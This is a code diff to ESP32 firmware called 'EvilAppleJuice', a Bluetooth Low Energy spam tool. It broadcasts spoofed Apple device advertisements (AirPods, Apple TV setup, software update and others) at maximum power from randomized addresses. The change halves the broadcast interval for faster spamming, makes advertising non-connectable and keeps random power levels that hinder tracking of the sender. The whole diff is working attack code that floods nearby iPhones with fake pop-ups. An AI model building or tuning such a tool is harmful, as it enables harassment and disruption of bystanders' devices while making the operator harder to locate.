@@ -200,7 +200,8 @@ void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLengt
 #endif
 
 BLEAdvertising *pAdvertising;  // global variable
-uint32_t delayMilliseconds = 100;
+BLEServer *pServer;
+uint32_t delayMilliseconds = 50;  // Reduced from 100 for faster broadcasts
 
 int currentMode = 0;
 bool isAdvertising = false;
@@ -209,6 +210,7 @@ Preferences preferences;
 // Button debounce
 unsigned long lastButtonTime = 0;
 const unsigned long DEBOUNCE_DELAY = 200;
+unsigned long lastBroadcastTime = 0;
 
 // ============= OLED DISPLAY FUNCTIONS =============
 void initDisplay() {
@@ -226,6 +228,7 @@ void initDisplay() {
   display.println("EvilAppleJuice");
   display.println("Initializing...");
   display.display();
+  delay(2000);
 }
 
 void updateDisplay() {
@@ -246,7 +249,7 @@ void updateDisplay() {
   // Status
   display.setCursor(0, 40);
   if (isAdvertising) {
-    display.println("Status: Broadcasting");
+    display.println("Status: BROADCASTING");
   } else {
     display.println("Status: Stopped");
   }
@@ -296,13 +299,23 @@ void handleButtons() {
     lastButtonTime = currentTime;
     isAdvertising = !isAdvertising;
     Serial.printf("Advertising toggled: %s\n", isAdvertising ? "ON" : "OFF");
+    
+    if (isAdvertising) {
+      pAdvertising->start();
+      Serial.println("BLE Advertising STARTED");
+    } else {
+      pAdvertising->stop();
+      Serial.println("BLE Advertising STOPPED");
+    }
+    
     updateDisplay();
   }
 }
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting ESP32 BLE with OLED");
+  delay(1000);
+  Serial.println("\n\nStarting ESP32 BLE with OLED");
 
   // Setup button pins
   pinMode(BUTTON_UP, INPUT_PULLUP);
@@ -319,27 +332,39 @@ void setup() {
   
   Serial.printf("Current Mode: %d\n", currentMode);
   
-  BLEDevice::init("AirPods 69");
-
-  // Increase the BLE Power to 21dBm (MAX)
+  // Initialize BLE
+  BLEDevice::init("EvilApple");
+  Serial.println("BLE Device initialized");
+  
+  // Set TX power
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_CONN, MAX_TX_POWER);
+  Serial.println("TX Power set to MAX");
 
   // Create the BLE Server
-  BLEServer *pServer = BLEDevice::createServer();
+  pServer = BLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
-
+  
+  // Set advertising parameters
+  pAdvertising->setMinPreferred(0x06);
+  pAdvertising->setMaxPreferred(0x12);
+  pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+  
   // Set initial device address
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+  esp_bd_addr_t random_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+  pAdvertising->setDeviceAddress(random_addr, BLE_ADDR_TYPE_RANDOM);
+  
+  Serial.println("BLE configured and ready");
   
   updateDisplay();
+  delay(1000);
 }
 
 void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
   uint8_t packet[31];
   size_t packetLen;
   generatePacket(dev, packet, packetLen);
-  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);
+  Serial.printf("Packet: %s (Len: %d)\n", dev.name, packetLen);
 
   #ifdef ESP_ARDUINO_VERSION_MAJOR
     #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
@@ -351,28 +376,9 @@ void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleD
 }
 
 void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
-  // Randomly pick data from one of the devices
   int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
   AppleDevice dev = ALL_DEVICES[idx];
   setAdvertisementData(oAdvertisementData, dev);
-}
-
-bool shouldBeLitOn(LEDMode mode) {
-  switch (mode) {
-    case ON:    return true;
-    case OFF:   return false;
-    case FLASH: return true;
-    default:    return false;
-  }
-}
-
-bool shouldBeLitOff(LEDMode mode) {
-  switch (mode) {
-    case ON:    return false;
-    case OFF:   return true;
-    case FLASH: return true;
-    default:    return false;
-  }
 }
 
 void loop() {
@@ -381,7 +387,7 @@ void loop() {
   
   // If not advertising, just wait
   if (!isAdvertising) {
-    delay(100);
+    delay(50);
     return;
   }
 
@@ -389,10 +395,6 @@ void loop() {
   esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   for (int i = 0; i < 6; i++){
     dummy_addr[i] = random(256);
-
-    // It seems for some reason first 4 bits
-    // Need to be high (aka 0b1111), so we 
-    // OR with 0xF0
     if (i == 0){
       dummy_addr[i] |= 0xF0;
     }
@@ -402,34 +404,34 @@ void loop() {
 
   switch (currentMode){
     case LEFT_OFF_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS]); // This one seems the most spammy
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS]);
       break;
     case LEFT_OFF_RIGHT_FLASH:
-    setRandomDeviceData(oAdvertisementData);
+      setRandomDeviceData(oAdvertisementData);
       break;
     case LEFT_OFF_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::SOFTWARE_UPDATE]); // This is fairly spammy, not all phones
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::SOFTWARE_UPDATE]);
       break;
     case LEFT_FLASH_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_GEN_2]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_GEN_2]);
       break;
     case LEFT_FLASH_RIGHT_FLASH:
-    setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::VISION_PRO]); // THis one affects very few devices, not as spammy (but kinda fun)
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::VISION_PRO]);
       break;
     case LEFT_FLASH_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_MAX]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_MAX]);
       break;
     case LEFT_ON_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_SETUP]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_SETUP]);
       break;
     case LEFT_ON_RIGHT_FLASH:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::TRANSFER_NUMBER]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::TRANSFER_NUMBER]);
       break;
     case LEFT_ON_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_PAIR]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_PAIR]);
       break;
     default:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::HOMEPOD_SETUP]); // TBD
+      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::HOMEPOD_SETUP]);
       break;
   }
 
@@ -446,23 +448,19 @@ void loop() {
   pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   pAdvertising->setAdvertisementData(oAdvertisementData);
 
-  // Start advertising
-  pAdvertising->start();
-
-  delay(delayMilliseconds); // delay for delayMilliseconds ms
-  pAdvertising->stop();
-
-  // Random signal strength increases the difficulty of tracking the signal
-  int rand_val = random(100);  // Generate a random number between 0 and 99
-  if (rand_val < 70) {  // 70% probability
+  // Random signal strength
+  int rand_val = random(100);
+  if (rand_val < 70) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-  } else if (rand_val < 85) {  // 15% probability
+  } else if (rand_val < 85) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
-  } else if (rand_val < 95) {  // 10% probability
+  } else if (rand_val < 95) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
-  } else if (rand_val < 99) {  // 4% probability
+  } else if (rand_val < 99) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
-  } else {  // 1% probability
+  } else {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
   }
+  
+  delay(delayMilliseconds);
 }
